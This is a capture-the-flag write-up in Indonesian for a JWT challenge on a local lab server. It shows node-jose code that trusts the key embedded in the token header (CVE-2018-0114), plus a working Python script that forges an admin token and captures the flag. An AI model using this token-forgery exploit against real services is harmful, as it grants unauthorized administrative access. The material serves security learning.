# WriteUp - Dasbod

## Overview

* **Judul:** Dasbod
* **Kategori:** Access Control / JWT Exploitation
* **Poin:** 80
* **Deskripsi:** Akses dashboard Admin.
* **URL:** `http://localhost:1337`

## Reconnaissance

### 1. File System Inspection

Pemeriksaan awal dilakukan terhadap struktur file di dalam container Docker. Ditemukan aplikasi Node.js yang menggunakan library `node-jose`.

```bash
$ docker exec dasbod-web-1 ls -la
total 20
drwxr-xr-x    1 root     root          4096 Feb  4 11:21 .
drwxr-xr-x    1 root     root          4096 Feb  4 14:49 ..
drwxr-xr-x   87 root     root          4096 Feb  3 12:30 node_modules
-rw-r--r--    1 root     root          3872 Feb  4 11:19 server.js
drwxr-xr-x    2 root     root          4096 Feb  3 12:27 views

```

### 2. Source Code Analysis (`server.js`)

Analisis kode sumber `server.js` menunjukkan implementasi JWT yang tidak biasa menggunakan library `node-jose`.

**Poin Penting:**

1. **Dynamic Key Generation:** Server membuat kunci RSA baru setiap kali login berhasil, dan tidak menyimpannya secara persisten.
2. **Embedded Key:** Public key disertakan langsung di dalam header token (`jwk`).
3. **Vulnerable Verification:** Fungsi verifikasi tidak memvalidasi asal kunci, melainkan mempercayai header token begitu saja.

```javascript
// server.js (Vulnerable Code)
app.post('/login', async (req, res) => {
    // ...
    // Generate key on the fly
    const keystore = jose.JWK.createKeyStore();
    const key = await keystore.generate('RSA', 2048, { alg: 'RS256', use: 'sig' });

    // Embed JWK in header
    const token = await jose.JWS.createSign(
        { format: 'compact', fields: { alg: 'RS256', typ: 'JWT', jwk: key.toJSON() } },
        key
    )
    // ...
});

app.get('/dashboard', async (req, res) => {
    // ...
    // VERIFICATION VULNERABILITY
    // Verifikasi dilakukan tanpa whitelist keystore, sehingga library akan menggunakan
    // kunci yang ada di header 'jwk' token itu sendiri.
    const result = await jose.JWS.createVerify().verify(token);
    // ...
});

```

## Vulnerability Analysis: CVE-2018-0114

Tantangan ini adalah demonstrasi klasik dari **CVE-2018-0114 (Cisco node-jose JWT Signature Bypass)**.

* **Deskripsi:** Library `node-jose` (sebelum versi 1.0.0) memiliki kerentanan di mana fungsi `JWS.createVerify().verify()` secara default mempercayai kunci publik yang disematkan dalam header JWS/JWT (parameter `jwk`).
* **Dampak:** Penyerang dapat membuat token JWS/JWT sembarang (misalnya mengubah `role: user` menjadi `role: admin`), menandatanganinya dengan Private Key milik penyerang sendiri, dan menyematkan Public Key penyerang di header token.
* **Mekanisme:** Server akan membaca header `jwk`, menggunakan kunci publik tersebut untuk memverifikasi tanda tangan (yang valid karena dibuat oleh pasangan private key-nya), dan menerima token sebagai token yang sah.

## Exploitation

Strategi eksploitasi (Bring Your Own Key):

1. Generate pasangan kunci RSA 2048-bit baru secara lokal.
2. Buat payload JSON yang diinginkan: `{"username": "WanZKey", "role": "admin"}`.
3. Buat token JWS/JWT.
4. Tanda tangani token menggunakan **Private Key lokal**.
5. Sematkan **Public Key lokal** ke dalam header token (`jwk` parameter).
6. Kirim token ke server.

### Script Solver (`exploit.py`)

Script ini menggunakan library `jwcrypto` untuk menangani pembuatan kunci dan struktur JWS yang kompleks.

```python
import requests
import json
from jwcrypto import jwk, jws # pip install jwcrypto

TARGET_URL = "http://localhost:1337"
DASHBOARD_URL = f"{TARGET_URL}/dashboard"

def exploit():
    print("[*] Generating Malicious RSA Keypair...")
    # 1. Generate kunci RSA milik penyerang
    key = jwk.JWK.generate(kty='RSA', size=2048)
    public_key = key.export(private_key=False, as_dict=True)
    
    # 2. Craft Payload Admin
    payload_data = {
        "username": "WanZKey",
        "role": "admin", 
        "iat": 1700000000 
    }
    payload_json = json.dumps(payload_data)
    
    print(f"[*] Crafting Token with Payload: {payload_json}")
    
    # 3. Create & Sign JWS
    token = jws.JWS(payload_json)
    
    # Embed Public Key di Header (Exploiting CVE-2018-0114)
    token.add_signature(
        key, 
        None, 
        json.dumps({"alg": "RS256", "jwk": public_key})
    )
    
    forged_token = token.serialize(compact=True)
    print(f"[*] Forged Token Generated!")
    
    # 4. Attack
    print("[*] Sending exploit to dashboard...")
    cookies = {"token": forged_token}
    
    r = requests.get(DASHBOARD_URL, cookies=cookies)
    
    if "pwn{" in r.text:
        print("\n" + "="*40)
        print("[+] PWNED! Flag Found:")
        for line in r.text.splitlines():
            if "pwn{" in line:
                print(line.strip().replace('<div class="flag">', '').replace('</div>', ''))
        print("="*40 + "\n")

if __name__ == "__main__":
    exploit()

```

### Output Terminal

```bash
$ ./exploit.py
[*] Generating Malicious RSA Keypair...
[*] Crafting Token with Payload: {"username": "WanZKey", "role": "admin", "iat": 1700000000}
[*] Forged Token Generated!
[*] Sending exploit to dashboard...

========================================
[+] PWNED! Flag Found:
pwn{82a58d944f86887ea60d5259def1c829}
========================================

```

## Flag

```
pwn{82a58d944f86887ea60d5259def1c829}

```
